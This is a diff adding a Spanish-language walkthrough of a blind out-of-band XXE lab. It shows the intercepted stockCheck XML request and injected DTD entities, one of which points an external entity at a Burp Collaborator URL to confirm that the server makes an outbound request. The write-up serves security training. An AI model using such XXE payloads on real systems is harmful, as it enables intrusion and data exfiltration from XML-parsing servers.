@@ -276,5 +276,76 @@ Y ya habremos terminado con este laboratorio 2.
 
 <br>
 
-# XXE Blind Out-of-band
+# Laboratorio 3: XXE Blind With Out-of-band
 
+En este laboratorio vemos que nos pide lo siguiente:
+
+![lab3](/assets/images/LabsXXE/lab3/lab3.png)
+
+nos dice que debemos usar una entidad externa, osea alguna url de otro servidor al que tengamos control de las peticiones que se reciben, y que hagamos una consulta HTTP usando como servidor a recibir, BurpCollaborator.
+
+Al acceder a este nivel y como sabemos interceptar la petición donde esta la parte vulnerable vemos la siguiente estructura XML:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+	<stockCheck>
+		<productId>
+			9
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+![xml](/assets/images/LabsXXE/lab3/xml.png)
+
+Podemos apreciar que tenemos esta estructura XML, y como ya hemos visto trataremos de inyectar nuestra entidad en el DTD:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe "hola"> ]>
+	<stockCheck>
+		<productId>
+			&xxe;
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+![invalid](/assets/images/LabsXXE/lab3/invalid.png)
+
+Podemos apreciar que nos dice que el ID del producto es invalido, esta vez ya no nos esta devolviendo ningun valor de alguna etiqueta que esta en la estructura XML.
+
+Por lo que en estos casos toca trabajar a ciegas usando algún servidor externo, BurpSuiteProfessional contiene un apartado llamado **"BurpCollaboratorClient"**, que se encuentra en la pestaña de arriba de Burp, lo que hace este apartado es crearnos un servidor al cual podamos enviar peticiónes para practicar esto, al abrir ese apartado veremos lo siguiente:
+
+![burp](/assets/images/LabsXXE/lab3/burp.png)
+
+Vemos este menu, y en la parte de **Generate collaborator payloads**, vemos un boton que dice **Copy to clipboard**, al darle nos copiara una url de un servidor que se acaba de crear y podremos recibir las peticiones que le hagamos, en el objetivo de este nivel solo es enseñarnos a usar esta función, así que al agregar esta url a la peticion:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://pjctd07aibvq11qf4eds3tzp7gd61v.burpcollaborator.net"> ]>
+	<stockCheck>
+		<productId>
+			14
+		</productId>
+		<storeId>
+			1
+		</storeId>
+	</stockCheck>
+```
+
+![url](/assets/images/LabsXXE/lab3/urlxml.png)
+
+Vemos que nos responde el mensaje **Invalid product ID**, pero si ahora en la sección de BurpCollaborator vamos y damos en el boton de PollNow veremos lo siguiente:
+
+![response](/assets/images/LabsXXE/lab3/response.png)
+
+Podemos apreciar que hemos recibido a nuestro servidor de burp, la petición HTTP que hemos interceptado y enviado.
+
+Y como este laboratorio solo era mostrarnos como funciona el BurpCollaborator habremos terminado este laboratorio:
+
+![fin](/assets/images/LabsXXE/lab3/fin.png)
